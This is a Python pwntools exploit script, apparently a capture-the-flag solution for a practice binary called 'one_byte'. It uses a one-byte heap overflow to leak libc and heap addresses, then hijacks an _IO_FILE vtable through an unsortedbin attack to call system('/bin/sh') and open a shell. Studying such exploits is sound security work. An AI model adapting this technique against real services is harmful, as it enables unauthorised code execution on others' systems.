#!/usr/bin/env python3


from pwn import *

BINARY = "./one_byte"
LIBC = "./libc.so.6"
ADDR = "localhost"
PORT = 4444

splash()
elf = context.binary = ELF(BINARY)
libc = ELF(LIBC, checksec=False)

# Global index variable to keep track of allocated chunks.
INDEX = 0


class Constants:
    CHUNK_SIZE = 0x58
    UNSORTED_BIN_HEAD_OFFSET = 0x58
    TIMEOUT = 0.1
    VTABLE_OFFSET = 0x178


def conn():
    if args.LOCAL:
        pty = process.PTY
        io = process(elf.path, stdin=pty, stdout=pty, stderr=pty)
        io.timeout = Constants.TIMEOUT

        return io

    if args.PWNDBG:
        context.log_level = "debug"
        context.terminal = ["tmux", "splitw", "-h"]
        return gdb.debug(elf.path, gdbscript="""init-pwndbg""")

    else:
        io = remote(ADDR, PORT)
        io.timeout = Constants.TIMEOUT

        return io


def malloc(io):
    global INDEX
    io.send("1")
    INDEX += 1
    io.recvuntil("> ")
    return INDEX - 1


def free(io, index):
    io.send("2")
    io.sendafter("index: ", f"{index}")
    io.recvuntil("> ")


def edit(io, index, data):
    io.send("3")
    io.sendafter("index: ", f"{index}")
    io.sendafter("data: ", data)
    io.recvuntil("> ")


def read(io, index):
    io.send("4")
    io.sendafter("index: ", f"{index}")
    data = io.recv(Constants.CHUNK_SIZE)
    io.recvuntil("> ")
    return data


def solve():
    io = conn()
    io.recvuntil("> ")

    """
    We allocate 5 0x60 chunks on the heap. Because a heap overflow vulnerability
    exists with the `edit()` function, we use this to conduct a one_byte
    overflow to overwrite the size of the tamper_chunk, forging its size to
    be the 0xc1. The tamper_chunk will be `free()`d, but it's too large for
    the fastbin, so it's linked into the unsortedbin. When we `malloc()` again,
    because no 0x60 candidates exist for allocation, `malloc()` remainders
    the tamper_chunk and allocates a 0x60 size chunk to the tamper_chunk again.
    `malloc()` writes the `fd` and `bk` pointers of the unsortedbin to the
    leaker_chunk, which we can leverage to acquire a glibc leak.
    """
    overflow_chunk = malloc(io)
    tamper_chunk = malloc(io)
    leaker_chunk = malloc(io)
    malloc(io)
    fake_vtable_chunk = malloc(io)

    payload = [
        cyclic(Constants.CHUNK_SIZE, n=8),
        0xC1,
    ]

    """
    Conduct a one byte heap buffer overflow to overwrite the tamper_chunk's
    size field, making the tamper_chunk too large for the fastbin.
    """
    edit(io, overflow_chunk, flat(payload))

    # `free()` the tamper_chunk, linking it into the unsortedbin.
    free(io, tamper_chunk)

    """
    Execute a `malloc()` for a 0x60 sized chunk. The tamper_chunk doesn't fit
    the request, thus it is linked into the smallbin. `malloc()` then uses the
    binmap to find a free chunk for this request. `malloc()` remainders the
    tamper_chunk that's in the unsortedbin, satisfying the request, splitting
    the tamper_chunk and writing the `fd` and `bk` pointers to the
    leaker_chunk.
    """
    tamper_chunk = malloc(io)

    """
    `read()` the contents of the leaker_chunk which should now contain the
    head of the unsortedbin, leaking the location of the main_arena.
    """
    libc.address = u64(read(io, leaker_chunk)[:8]) - (
        libc.sym.main_arena + Constants.UNSORTED_BIN_HEAD_OFFSET
    )
    log.info(f"libc base found at: 0x{libc.address:02x}")

    """
    We conduct another `malloc()` for a 0x60 sized chunk, acquiring the
    remainder that overlaps the leaker_chunk. We free the overflow_chunk in
    order to link the chunk into the fastbin. Then we free our overlap/leak
    chunk to link the chunk into the fastbin, creating a heap leak.
    """
    overlap_chunk = malloc(io)
    free(io, overflow_chunk)
    free(io, overlap_chunk)

    # `read()` the heap address written into the leaker_chunk.
    heap = u64(read(io, leaker_chunk)[:8])
    log.info(f"heap base found at: 0x{heap:02x}")

    # Empty the fastbin to acquire access to the overflow_chunk again
    overlap_chunk = malloc(io)
    overflow_chunk = malloc(io)

    """
    We conduct another one byte heap buffer overflow to overwrite the size of
    the tamper_chunk back to 0xc1. We're going to use this to get the
    leaker_chunk back into the unsortedbin.
    """
    payload = [
        cyclic(Constants.CHUNK_SIZE, n=8),
        0xC1,
    ]

    edit(io, overflow_chunk, flat(payload))

    """
    We `free()` the tamper_chunk, leaking it back into the unsortedbin. We
    follow this with a `malloc()` call, causing the tamper_chunk to be linked
    into the smallbin. Finally, our `malloc()` request is serviced by
    remaindering the tamper_chunk, writing `fd` and `bk` pointers into the
    leaker_chunk.
    """
    free(io, tamper_chunk)
    tamper_chunk = malloc(io)

    """
    We setup the leaker_chunk, which is currently in the unsortedbin, to setup
    our unsortedbin attack. We overwrite the `fd` to NULL, the `bk` to a fake
    chunk overlapping the `_IO_list_all` address, and we forge the `write_base`
    and `write_ptr` attributes of our fake `_IO_FILE` struct.
    """
    fd = 0
    write_base = 0
    write_ptr = 1
    payload = [
        fd,
        libc.sym._IO_list_all - 0x10,
        write_base,
        write_ptr,
    ]

    edit(io, leaker_chunk, flat(payload))

    """
    Write the string "/bin/sh\0" into the last quadword of the tamper_chunk's
    user data. We also use the one byte heap buffer overflow to modify the
    leaker_chunk's size field, changing it to 0x69. This keeps the prev_inuse
    bet set, however, when checks are conducted for our final 0x60 `malloc()`
    call to trigger the unsortedbin attack, our unsortedbin attack candidate,
    the leaker_chunk, will get linked into the unsortedbin rather than being
    allocated because it's size field is corrupted.
    """
    payload = [cyclic(0x50, n=8), b"/bin/sh\0", 0x69]

    edit(io, tamper_chunk, flat(payload))

    """
    Finally, we write the address of glibc.sym.system to the location of our
    fake _overflow entry in our fake vtable. We overwrite the vtable_ptr
    of our forged `_IO_FILE` struct to point back into the heap, overlapping
    our fake _overflow entry that contains a pointer to libc.sym.system.
    """
    payload = [libc.sym.system, heap + Constants.VTABLE_OFFSET]

    edit(io, fake_vtable_chunk, flat(payload))

    # Trigger the unsortedbin attack.
    malloc(io)

    io.interactive()


if __name__ == "__main__":
    solve()
